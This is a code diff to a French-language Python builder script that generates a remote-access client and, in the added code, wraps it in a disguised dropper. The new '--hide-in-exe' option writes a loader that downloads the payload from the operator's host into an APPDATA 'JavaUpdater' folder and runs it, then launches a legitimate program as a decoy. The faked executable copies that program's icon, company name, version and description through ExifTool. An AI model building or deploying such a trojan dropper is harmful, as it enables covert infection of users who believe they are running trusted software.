@@ -43,6 +43,12 @@ parser.add_argument('--freeze',
                     dest='freeze',
                     default=False,
                     help='compile le client dans un executable')
+parser.add_argument('--hide-in-exe',
+                    type=str,
+                    required=False,
+                    dest='path_exe',
+                    default='',
+                    help='Cache un payload dans un exe sain')
 parser.add_argument('--obf',
                     action='store_const',
                     const=True,
@@ -51,12 +57,11 @@ parser.add_argument('--obf',
                     default=False,
                     help='obfusque le code python')
 parser.add_argument('--icon',
-                    action='store_const',
-                    const=True,
+                    type=str,
                     required=False,
                     dest='icon',
-                    default=False,
-                    help='obfusque le code python')
+                    default='',
+                    help='Ajoute une icon à l\'éxecutable')
 
 args = parser.parse_args()
 
@@ -65,8 +70,10 @@ class GenClient:
     pathDirFichier = "./code/"
     pathDirOutput = "./output/"
     pathDirHttp = "./http/"
+    pathPyInstaller = "C:/Users/theoc/AppData/Local/Programs/Python/Python37/Scripts/pyinstaller.exe"
+    upx_dir = "C:\\Users\\theoc\\Downloads\\upx-3.96-win64\\upx-3.96-win64"
 
-    def GenererClient(self, ip, port, persistance, name, freeze, obf, icon):
+    def GenererClient(self, ip, port, persistance, name, freeze, obf, icon, path_exe):
         fin_dropeur = """)))))
     except Exception as e:
         print(str(e))
@@ -104,37 +111,124 @@ class GenClient:
         fichier.write(debut_loader + drop_txt + fin_loader)
         fichier.close()
         # si l'options freeze est choisi
-        if freeze:
-            ## Complier le loader
-            if icon:
-                os.system("C:/Users/theoc/AppData/Local/Programs/Python/Python37/Scripts/pyinstaller.exe " + self.pathDirOutput + "load_" + name + ".pyw" + " --upx-dir C:\\Users\\theoc\\Downloads\\upx-3.96-win64\\upx-3.96-win64 --clean -y --onefile --noconsole")
+        if path_exe == "": ###--include-data-file=\"C:\\Users\\theoc\\AppData\\Local\\Programs\\Python\\Python37\\Lib\\site-packages\\pyHook\\=data\\pyHook\\_cpyHook.cp37-win_amd64.pyd\"
+            if freeze: ### --onefile
+                ## Complier le loader
+                if icon == "":
+                    cmd = "py -m nuitka --follow-imports --include-data-file=\"C:\\Users\\theoc\\AppData\\Local\\Programs\\Python\\Python37\\Lib\\site-packages\\pyHook\\_cpyHook.cp37-win_amd64.pyd=_cpyHook.cp37-win_amd64.pyd\" --onefile {}".format(self.pathDirOutput + "load_" + name + ".pyw")
+                    os.system(cmd)
+                else:
+                    cmd = "py -m nuitka --follow-imports --include-data-file=\"C:\\Users\\theoc\\AppData\\Local\\Programs\\Python\\Python37\\Lib\\site-packages\\pyHook\\_cpyHook.cp37-win_amd64.pyd=_cpyHook.cp37-win_amd64.pyd\" --onefile {}".format(self.pathDirOutput + "load_" + name + ".pyw")
+                    os.system(cmd)
+                print("Compilation terminer")
+                print("Nettoyage des fichier temporaire")
+                # netoyyer fichier temporaire
+                shutil.copyfile("load_" + name + ".exe", self.pathDirOutput + name + ".exe")
+                if os.path.exists(self.pathDirOutput + "drop_" + name + ".pyw"):
+                    os.remove(self.pathDirOutput + "drop_" + name + ".pyw")
+                if os.path.exists(self.pathDirOutput + "load_" + name + ".pyw"):
+                    os.remove(self.pathDirOutput + "load_" + name + ".pyw")
+                if os.path.exists("load_" + name + ".exe"):
+                    os.remove("load_" + name + ".exe")
+                shutil.rmtree("load_" + name + ".dist/")
+                shutil.rmtree("load_" + name + ".build/")
+                shutil.rmtree("load_" + name + ".onefile-build/")
+
+                print("Client executable prêt : output/" + name + ".exe")
             else:
-                os.system("C:/Users/theoc/AppData/Local/Programs/Python/Python37/Scripts/pyinstaller.exe " + self.pathDirOutput + "load_" + name + ".pyw" + " --upx-dir C:\\Users\\theoc\\Downloads\\upx-3.96-win64\\upx-3.96-win64 --clean -y --onefile --noconsole --icon C:\\Users\\theoc\\Downloads\\icon.ico")
-            print("Compilation terminer")
-            print("Nettoyage des fichier temporaire")
-            # netoyyer fichier temporaire
+                print("Client prêt : output/" + "load_" + name + ".pyw")
+        else:
+            ## Complier le loader
+            cmd = "py -m nuitka --follow-imports --include-data-file=\"C:\\Users\\theoc\\AppData\\Local\\Programs\\Python\\Python37\\Lib\\site-packages\\pyHook\\_cpyHook.cp37-win_amd64.pyd=_cpyHook.cp37-win_amd64.pyd\" --onefile {}".format(self.pathDirOutput + "load_" + name + ".pyw")
+            os.system(cmd)
+            shutil.copyfile("load_" + name + ".exe", self.pathDirHttp + name + ".exe")
             if os.path.exists(self.pathDirOutput + "drop_" + name + ".pyw"):
                 os.remove(self.pathDirOutput + "drop_" + name + ".pyw")
             if os.path.exists(self.pathDirOutput + "load_" + name + ".pyw"):
                 os.remove(self.pathDirOutput + "load_" + name + ".pyw")
-            if os.path.exists("load_" + name + ".spec"):
-                os.remove("load_" + name + ".spec")
-            shutil.copyfile("dist/" + "load_" + name + ".exe", self.pathDirOutput + name + ".exe")
-            shutil.rmtree("dist/")
-            shutil.rmtree("build/")
-            shutil.rmtree("output/__pycache__")
-            print("Client executable prêt : output/" + name + ".exe")
-        else:
-            print("Client prêt : output/" + "load_" + name + ".pyw")
+            if os.path.exists("load_" + name + ".exe"):
+                os.remove("load_" + name + ".exe")
+            shutil.rmtree("load_" + name + ".dist/")
+            shutil.rmtree("load_" + name + ".build/")
+            shutil.rmtree("load_" + name + ".onefile-build/")
 
-        
+
+            ## Récupérer l'icon du fichier safe
+            #path_ico = self.PngToIcon(self.ExtractIcon(path_exe))
+
+            name_payload = os.path.basename(self.pathDirHttp + name + ".exe")
+            name_exe = os.path.basename(path_exe)
+            url_payload = "\"http://" + ip + ":" + str(port + 1) + "/" + name_payload + "\""
+            url_safe = "\"http://" + ip + ":" + str(port + 1) + "/" + name_exe + "\""
+            # host le fichier safe
+            shutil.copyfile(path_exe, self.pathDirHttp + name_exe)
+            loader_hide_file = """import os
+import subprocess
+import urllib.request
+import os
+pathAppData = os.getenv('APPDATA')
+pathDir = pathAppData + "\\\\JavaUpdater\\\\"
+if not os.path.exists(pathDir):
+    os.makedirs(pathDir)
+if not os.path.exists(pathDir + "{}"):
+    urllib.request.urlretrieve({},pathDir + "{}")
+cmd = "start " + pathDir + "{}"
+resCmd = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
+                          stdin=subprocess.DEVNULL, stderr=subprocess.PIPE,)
+if not os.path.exists(pathDir + "{}"):
+    urllib.request.urlretrieve({},pathDir + "{}")
+cmd = "start " + pathDir + "{}"
+resCmd = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
+                          stdin=subprocess.DEVNULL, stderr=subprocess.PIPE,)
+os._exit(0)""".format(name_payload, url_payload, name_payload, name_payload, name_exe, url_safe, name_exe, name_exe)
+
+            name_exe_no_ext, ext_exe  = os.path.splitext(os.path.basename(path_exe))
+            fichier = open(self.pathDirOutput + name_exe_no_ext + ".pyw", "w")
+            fichier.write(loader_hide_file)
+            fichier.close()
+            ## Compiler le faux programmes
+            fileVersionNumber, companyName, fileDescription = self.ExtractInfo(path_exe)
+            ##--windows-company-name=  --windows-file-version=  --windows-file-description=
+            cmd = "py -m nuitka --windows-icon-from-exe={} --windows-file-version=\"{}\" --windows-company-name=\"{}\" --windows-file-description=\"{}\" --onefile {}".format(path_exe, fileVersionNumber, companyName, fileDescription, self.pathDirOutput + name_exe_no_ext + ".pyw")
+            os.system(cmd)
+            shutil.copyfile(name_exe_no_ext + ".exe", self.pathDirOutput + name_exe_no_ext + ".exe")
+            if os.path.exists(self.pathDirOutput + name_exe_no_ext + ".pyw"):
+                os.remove(self.pathDirOutput + name_exe_no_ext + ".pyw")
+            if os.path.exists(name_exe_no_ext + ".exe"):
+                os.remove(name_exe_no_ext + ".exe")
+            shutil.rmtree(name_exe_no_ext + ".dist/")
+            shutil.rmtree(name_exe_no_ext + ".build/")
+            shutil.rmtree(name_exe_no_ext + ".onefile-build/")
+
+            ## & '.\exiftool(-k).exe' C:\Users\theoc\Desktop\putty.exe
+            """
+            File Version Number
+            Company Name
+            FileDescription
+            """
+            
+
 
     def ReturnFichier(self, nom_fichier):
         fichier = open(self.pathDirFichier + nom_fichier, "r")
         text = fichier.read()
         fichier.close()
         return text
+
+    def ExtractInfo(self, file):
+        
+        import exiftool
+
+        with exiftool.ExifTool("C:/Users/theoc/AppData/Local/Programs/Python/Python37/exiftool(-k).exe") as et:
+            print("Lancement de ExifTool")
+            metadata = et.get_metadata(file)
+            fileVersionNumber = metadata["EXE:FileVersionNumber"]
+            companyName = metadata["EXE:CompanyName"]
+            fileDescription = metadata["EXE:FileDescription"]
+            print("{} {} {}".format(fileVersionNumber, companyName, fileDescription))
+            return fileVersionNumber, companyName, fileDescription
+        
         
 
-GenClient().GenererClient(args.host, args.port, args.persistance, args.name, args.freeze, args.obf, args.icon)
+GenClient().GenererClient(args.host, args.port, args.persistance, args.name, args.freeze, args.obf, args.icon, args.path_exe)
 
